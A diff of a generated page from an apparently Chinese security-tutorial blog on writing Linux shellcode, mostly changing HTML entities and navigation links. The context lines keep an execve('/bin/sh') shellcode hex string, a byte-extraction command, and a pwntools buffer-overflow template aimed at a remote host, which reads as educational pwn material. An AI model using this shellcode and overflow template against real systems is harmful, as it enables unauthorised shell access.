@@ -283,7 +283,7 @@ code:
 get_string:
       call code
 data:
-db &#39;hello world&#39;, 0x0a
+db &apos;hello world&apos;, 0x0a
 </code></pre><p>linux系统调用是通过 int 0x80来陷入内核态的，在此过程中系统调用号通过eax来传递，而参数则是通过ebx，ecx,edx，esi来传递的。</p>
 <p>在补充了这些基础知识后我们开始真正的着手开始编写shellcode,可以直接使用gcc对汇编文件.S进行编译链接，生成标准的可执行ELF文件，同时也是直接进行测试，但又一点不方便的是提取机械码很不方便。</p>
 <p>为了提高提取机械码的效率，nasm编译器生成bin格式文件，而且没有其他东西，棒棒哒</p>
@@ -343,7 +343,7 @@ int 0x80
 </code></pre><p>编译生成机器码</p>
 <pre><code>nasm -o shell2 shell2.s
 </code></pre><p>生成的shell2文件为bin数据，全是机器码，没有任何格式数据，使用Linux命令转换成bash或者perl可输入的shellcode.</p>
-<pre><code>$ od -t x1 shell2 | sed -e &#39;s/[0-7]*//&#39; | sed -e &#39;s/ /\\x/g&#39;
+<pre><code>$ od -t x1 shell2 | sed -e &apos;s/[0-7]*//&apos; | sed -e &apos;s/ /\\x/g&apos;
 </code></pre><p>得到</p>
 <blockquote>
 <p>\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52<br>\x53\x89\xe1\x31\xc0\xb0\x0b\xcd</p>
@@ -366,8 +366,8 @@ int 0x80
 from pwn import *
 
 sh = remote(&quot;????&quot;,????) # 与服务器交互
-junk = &#39;a&#39;*0x?? # 填充
-fakebp = &#39;a&#39;*8# 淹没bp
+junk = &apos;a&apos;*0x?? # 填充
+fakebp = &apos;a&apos;*8# 淹没bp
 syscall = ?????????????
 payload = junk + fakebp + p64(syscall) # p64对整数进行打包
 sh.send(payload)
@@ -443,16 +443,16 @@ sh.interactive() # 直接反弹shell进行交互
                         <span class="art-item-left">
                             <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
                             <h4>
-                                <a href="/2018/06/14/实用小工具/" rel="prev" title="bin实用小工具">
+                                <a href="/2018/06/14/linux-banding/" rel="prev" title="linux上的延迟重定位">
                                   
-                                      bin实用小工具
+                                      linux上的延迟重定位
                                   
                                 </a>
                             </h4>
                             
                                 
                                 <h6 class="tags">
-                                    <a class="tag" href="/tags/pwn/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>pwn</a> <a class="tag" href="/tags/re/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>re</a>
+                                    <a class="tag" href="/tags/linux/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>linux</a> <a class="tag" href="/tags/plt-got/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>plt&got</a>
                                 </h6>
                             
                         </span>
@@ -487,11 +487,11 @@ sh.interactive() # 直接反弹shell进行交互
             
                 <li><a href="http://yoursite.com/2018/06/14/最基本的堆溢出-fastbin/">堆与最基本的堆溢出-fastbin</a></li>
             
-                <li><a href="http://yoursite.com/2018/06/14/linux-banding/">linux上的延迟重定位</a></li>
+                <li><a href="http://yoursite.com/2018/06/14/linux上的延迟重定位/">linux上的链接</a></li>
             
                 <li><a href="http://yoursite.com/2018/06/14/格式化字符串漏洞/">格式化字符串漏洞</a></li>
             
-                <li><a href="http://yoursite.com/2018/06/14/实用小工具/">bin实用小工具</a></li>
+                <li><a href="http://yoursite.com/2018/06/14/linux-banding/">linux上的延迟重定位</a></li>
             
         </ul>
     </div>
